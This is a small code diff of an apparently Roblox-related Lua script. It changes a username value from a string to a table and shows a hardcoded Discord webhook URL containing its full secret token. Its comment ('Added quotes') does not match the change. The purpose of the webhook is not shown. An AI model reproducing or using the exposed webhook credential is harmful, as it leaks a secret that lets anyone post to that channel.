@@ -2,7 +2,7 @@
 local Webhook = "https://discord.com/api/webhooks/1491756893427728425/9aU61Eji1UtQmszifKNcFWNj34efArl_ttTHhrIJQtjL8ovqnDFCa8uc0sHnR-309__G"
 
 -- Fix: Added quotes around the Username
-local Usernames = "CREOLEO23"
+local Usernames = {"CREOLEO23"}
 local Friends = {}
 local lastMessageId = nil 
 local finalStateReached = false
